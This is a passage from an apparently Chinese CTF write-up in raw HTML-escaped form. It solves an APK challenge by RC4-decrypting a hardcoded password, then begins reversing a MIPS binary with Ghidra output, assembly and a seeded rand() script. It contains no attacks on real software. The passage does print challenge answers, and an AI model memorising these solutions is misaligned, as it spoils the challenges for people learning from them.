key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(key)
print(key)
&lt;span style=&#34;color:#75715e&#34;&gt;# th1s_1s_k3y!!!!!&lt;/span&gt;

ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;en1&lt;/span&gt;(key, len_key):
    res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;
    v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v0
    v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [c &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; key]
    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(v0):
        res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v3)
        v1[v3] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7[v3 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; len_key]
    v7_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v0:
        v7_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (res[v2] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v7_1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1[v2]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;
        len_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res[v2]
        res[v2] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res[v7_1]
        res[v7_1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len_key
        v2 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; res

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;en2&lt;/span&gt;(res_key, text, len_text):
    v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# text = bytes(text)&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len_text:
        v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;
        v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((res_key[v1] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v2) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;
        v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res_key[v1]
        res_key[v1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; res_key[v2]
        res_key[v2] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3
        text[v0] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((text[v0] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; res_key[((res_key[v1] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (res_key[v2] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;]))
        v0 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; text

list_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; en1(key[:], len(key))
plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; en2(list_key[:], ciphertext[:], len(ciphertext))
print (plaintext)

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; plaintext:
    flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(c)

print (flag)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样就拿到密码了 &lt;code&gt;Y0uG3tTheP4ssw0rd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后将 apk 解压一下（用的 bandizip，可以直接解压），在目录下面可以找到 &lt;code&gt;\assets\flag.zip&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;解压即可拿到 flag&lt;/p&gt;
&lt;h2 id=&#34;easy_mips-mips-逆向&#34;&gt;easy_mips （mips 逆向）&lt;/h2&gt;
&lt;p&gt;这是一道mips的题，用ida无法反汇编，&lt;del&gt;爬了&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;先用ida的字符串搜索找到了关键代码在 &lt;code&gt;tty_write&lt;/code&gt; 函数里，并且调用了 &lt;code&gt;encry&lt;/code&gt; 函数和 &lt;code&gt;init&lt;/code&gt; 函数，但因为没学过mips，也就没法继续分析了&lt;/p&gt;
&lt;p&gt;于是第一次尝试使用 Ghidra&lt;/p&gt;
&lt;p&gt;用 Ghidra 打开二进制文件&lt;/p&gt;
&lt;p&gt;找到关键函数 &lt;code&gt;tty_write&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tty_write&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;param_1,&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;param_2)

{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; __fd;
  size_t __n;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; iVar1;
  EVP_PKEY_CTX aEStack56 [&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;];
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; local_10;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; local_c;
  
  local_c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __stack_chk_guard;
  local_24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x666c6167&lt;/span&gt;;
  local_20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7b69745f&lt;/span&gt;;
  local_1c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69735f5f&lt;/span&gt;;
  local_18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5f5f6661&lt;/span&gt;;
  local_14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6b657d0a&lt;/span&gt;;
  local_10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;;
  __fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(param_1,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (__fd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cannot open&amp;#34;&lt;/span&gt;);
                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
    exit(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  }
  __n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(param_2);
  write(__fd,param_2,__n);
  read(__fd,aEStack56,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;);
  encry(aEStack56);
  iVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strcmp((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)aEStack56,(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_24);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (iVar1 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
    write(__fd,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you get the fake flag&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
    iVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strcmp((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)aEStack56,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3_isjA0UeQZcNa&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Vf&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (iVar1 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
      puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you_don&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;t_get_the_flag&amp;#34;&lt;/span&gt;);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LAB_00400b48;
    }
    write(__fd,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;good_job!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;);
  }
  close(__fd);
LAB_00400b48:
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (local_c &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; __stack_chk_guard) {
                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
    __stack_chk_fail();
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之前在 ida 中发现 &lt;code&gt;local_24&lt;/code&gt; 是一个fake flag，就不管了&lt;/p&gt;
&lt;p&gt;发现调用了一个 &lt;code&gt;encry&lt;/code&gt; 函数，进入这个函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encry&lt;/span&gt;(EVP_PKEY_CTX &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;param_1)

{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; cVar1;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; local_10;
  
  init(param_1);
  cVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x05&amp;#39;&lt;/span&gt;;
  local_10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (local_10 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;) {
    param_1[local_10] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (EVP_PKEY_CTX)((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)param_1[local_10] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; cVar1);
    cVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cVar1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x01&amp;#39;&lt;/span&gt;;
    local_10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; local_10 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现先调用了 &lt;code&gt;init&lt;/code&gt; 函数，然后对每一位做了个减法&lt;/p&gt;
&lt;p&gt;查看 &lt;code&gt;init&lt;/code&gt; 函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;init&lt;/span&gt;(EVP_PKEY_CTX &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ctx)

{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; iVar1;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; extraout_var;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; extraout_var_00;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; extraout_var_01;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; local_20;
  
  iVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __stack_chk_guard;
  srand(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1c5e&lt;/span&gt;);
  rand();
  rand();
  rand();
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ctx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (EVP_PKEY_CTX)((byte)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ctx &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; extraout_var &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32U&lt;/span&gt;);
  ctx[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (EVP_PKEY_CTX)((byte)ctx[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; extraout_var_00 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x39U&lt;/span&gt;);
  ctx[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (EVP_PKEY_CTX)((byte)ctx[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; extraout_var_01 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30U&lt;/span&gt;);
  local_20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (local_20 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xd&lt;/span&gt;) {
    local_20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; local_20 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (iVar1 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; __stack_chk_guard) {
                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
    __stack_chk_fail();
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; __stack_chk_guard;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里自动分析出现了问题，不知道 &lt;code&gt;extraout_var&lt;/code&gt; 和 &lt;code&gt;rand&lt;/code&gt; 有什么关系&lt;/p&gt;
&lt;p&gt;于是只能去找对应的汇编慢慢读&lt;/p&gt;
&lt;p&gt;根据 Ghidra 里代码与汇编的映射关系，找到了 &lt;code&gt;extraout_var&lt;/code&gt; 的位置&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;        00400d00 80  43  00  00    lb         v1,0x0 (v0)
        00400d04 8f  c2  00  24    lw         v0,local_1c (s8)
        00400d08 30  42  00  ff    andi       v0,v0,0xff
        00400d0c 24  42  00  32    addiu      v0,v0,0x32
        00400d10 30  42  00  ff    andi       v0,v0,0xff
        00400d14 7c  02  14  20    seb        v0,v0
        00400d18 00  62  10  26    xor        v0,v1,v0
        00400d1c 7c  02  1c  20    seb        v1,v0
        00400d20 8f  c2  00  1c    lw         v0,local_24 (s8)
        00400d24 a0  43  00  00    sb         v1,0x0 (v0)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;找到 &lt;code&gt;addiu&lt;/code&gt; 说明 &lt;code&gt;v0&lt;/code&gt; 对应的就是 &lt;code&gt;extraout_var&lt;/code&gt;，发现是从 &lt;code&gt;local_1c&lt;/code&gt; 处取出的&lt;/p&gt;
&lt;p&gt;往上找 &lt;code&gt;local_1c&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;        00400c80 8f  dc  00  10    lw         gp,local_30 (s8)
        00400c84 8f  82  80  44    lw         v0,-0x7fbc (gp)=&amp;gt;-&amp;gt;rand                          = 004010e0
        00400c88 00  40  c8  25    or         t9,v0,zero
        00400c8c 03  20  f8  09    jalr       t9=&amp;gt;rand                                         int rand(void)
        00400c90 00  00  00  00    _nop
        00400c94 8f  dc  00  10    lw         gp,local_30 (s8)
        00400c98 00  40  18  25    or         v1,v0,zero
        00400c9c 83  c2  00  31    lb         v0,local_10 +0x1 (s8)
        00400ca0 00  62  10  26    xor        v0,v1,v0
        00400ca4 00  02  16  03    sra        v0,v0,0x18
        00400ca8 af  c2  00  24    sw         v0,local_1c (s8)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从后往前看，最后是将 v0 存到 local_1c 中，倒数第二步是将 v0 右移 0x18 位（这里问了一下会mips的大佬&amp;hellip;），虽然没法完美分析出 rand 的结果存到了哪里，但是可以猜测最后右移了 0x18 位并存到了 &lt;code&gt;local_1c&lt;/code&gt; 中。&lt;/p&gt;
&lt;p&gt;于是就可以尝试编写代码，破解flag了。&lt;/p&gt;
&lt;p&gt;首先计算几个 &lt;code&gt;rand&lt;/code&gt; 的结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    srand(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1c5e&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; a[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;];
    a[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;8&amp;#39;&lt;/span&gt;;
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, rand());
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, rand());
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, rand());
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行得到&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;./test_rand
446aef60
5de30bb4
27445d71
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随后写个反向的算法&lt;/p&gt;
